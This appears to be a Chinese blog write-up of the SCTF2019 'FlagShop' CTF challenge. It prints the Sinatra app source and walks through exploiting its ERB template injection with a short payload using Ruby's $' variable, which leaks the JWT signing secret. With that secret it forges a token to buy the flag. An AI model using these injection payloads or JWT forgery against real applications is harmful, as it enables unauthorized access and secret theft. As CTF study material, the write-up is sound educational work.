---
title: SCTF2019-FlagShop
date: 2025-04-24 23:14:49
tags:
- 刷题笔记
- ruby模块注入
- jwt伪造
- ruby预定义字符
category:
- 刷题笔记
---

# SCTF2019-FlagShop

一进来是这样的页面

![](../image/SCTF2019-FlagShop-1.png)

点reset会重置，按work我们的JinKela就会随机增加，先抓个包看看

![](../image/SCTF2019-FlagShop-2.png)

可以看到Cookie是标准的三段式，可以猜测是JWT，在[jwt网站](https://jwt.io/)进行一个解密

![](../image/SCTF2019-FlagShop-3.png)

这里猜测我们只需要将jkl的值改写的超过买flag的值即可，所以我们现在需要寻找密钥才能修改。

查看robots.txt，提示我们访问/filebak，找到源码

```
require 'sinatra'
require 'sinatra/cookies'
require 'sinatra/json'
require 'jwt'
require 'securerandom'
require 'erb'
 
set :public_folder, File.dirname(__FILE__) + '/static'
 
FLAGPRICE = 1000000000000000000000000000
ENV["SECRET"] = SecureRandom.hex(64)
 
configure do
  enable :logging
  file = File.new(File.dirname(__FILE__) + '/../log/http.log',"a+")
  file.sync = true
  use Rack::CommonLogger, file
end
 
get "/" do
  redirect '/shop', 302
end
 
get "/filebak" do
  content_type :text
  erb IO.binread __FILE__
end
 
get "/api/auth" do
  payload = { uid: SecureRandom.uuid , jkl: 20}
  auth = JWT.encode payload,ENV["SECRET"] , 'HS256'
  cookies[:auth] = auth
end
 
get "/api/info" do ##验证JWT，返回其中的UID和jkl字段
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  json({uid: auth[0]["uid"],jkl: auth[0]["jkl"]})
end
 
get "/shop" do
  erb :shop
end
 
get "/work" do ##处理一个名为do的参数，根据条件修改JWT中的jkl字段
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  auth = auth[0]
  unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
    end
  end
 
  if params[:do] == "#{params[:name][0,7]} is working" then
 
    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result
 
  end
end
 
post "/shop" do  ##检查jkl是否足够高，如果足够则向JWT中添加flag字段。
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
 
  if auth[0]["jkl"] < FLAGPRICE then
 
    json({title: "error",message: "no enough jkl"})
  else
 
    auth << {flag: ENV["FLAG"]}
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    json({title: "success",message: "jkl is good thing"})
  end
end
 
 
def islogin
  if cookies[:auth].nil? then
    redirect to('/shop')
  end
end
```

代码审计后主要看/work这段代码

```
  if params[:do] == "#{params[:name][0,7]} is working" then
 
    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result
```

条件，也就是`params[:do]` 是否等于 `params[:name][0,7] + " is working"`。

但是弹窗没有任何有用的信息，看了部分大佬的wp知道了原来是涉及了一个ruby模块注入。Ruby全局变量汇总，[Ruby全局变量汇总](https://blog.csdn.net/zdq0394123/article/details/8443694)，[ruby教程](https://www.runoob.com/ruby/ruby-tutorial.html)，[手把手教你ruby模块注入](https://www.anquanke.com/post/id/86867)

我们要通过<%=%>进行模板注入，弹窗代码`{params[:name][0,7]}`使我们只能在模块中再进行2个字符的输入，也就是说我们不能够直接输入SECRET来得到我们的密钥，所以就需要用到Ruby的预定义字符了。

如果没有限制长度，可以直接输出ENV["SECRET"]

```
/work?SECRET=&name=<%= ENV["SECRET"] %>&do=<%= ENV["SECRET"] %> is working
```

但是这里限制长度了，可以使用$‘，因为前面 `if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")`对ENV['SECRET']进行了正则匹配，所以$'输出的就是ENV["SECRET"]的值

$’ 最后一次模式匹配中匹配部分之后的字符串

```
/work?SECRET=&name=<%=$'%>&do=<%=$'%> is working
```

这里需要传一个空的SECRET是为了可以搜索SECRET参数内容，然后使 <%=$'%>返回最后一次匹配的字符串是我们的密钥。

但是不能直接传入要先进行一次url编码

```
?SECRET=&name=%3C%25%3D%24%27%25%3E&do=%3C%25%3D%24%27%25%3E%20is%20working
```

抓work的包然后修改。发送查看响应包发现成功拿到密钥。

![](../image/SCTF2019-FlagShop-4.png)

```
4eb7215558d02d53f8f5530a6173c91905448d8a4d70566080f68db14025f8f00ba79ca763bf909fad17108621250ff2150f04503e9b447061149076a55a6fe3
```

密钥拿到了，然后直接进行jkl的修改使其达到能购买flag。

![](../image/SCTF2019-FlagShop-5.png)

得到jwt即payload：

```
eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiI1MjEyMjc0My00MWE4LTRmNjgtYWVlMy0wZDA4NjkyOTljNjYiLCJqa2wiOjFlKzI3fQ.p2mR_l3eFdiUakt8Z0vFemkYsUsTLd1DqcKG8gQaukM
```

回到/shop点击buy flag然后抓包修改jwt，然后会返回一个新的Cookie，也是jwt格式，base64解码就是flag，这里只要解压前两段即可

![](../image/SCTF2019-FlagShop-6.png)

```
eyJhbGciOiJIUzI1NiJ9.W3sidWlkIjoiNTIxMjI3NDMtNDFhOC00ZjY4LWFlZTMtMGQwODY5Mjk5YzY2IiwiamtsIjoxLjBlKzI3fSx7ImFsZyI6IkhTMjU2In0seyJmbGFnIjoiZmxhZ3sxYjU0NjlhYy0xZGFmLTQ4N2EtOGIxYi0xZjZjMzdiN2FhMDF9In1d
```

base64解码

```
{"alg":"HS256"}[{"uid":"52122743-41a8-4f68-aee3-0d0869299c66","jkl":1.0e+27},{"alg":"HS256"},{"flag":"flag{1b5469ac-1daf-487a-8b1b-1f6c37b7aa01}"}]
```

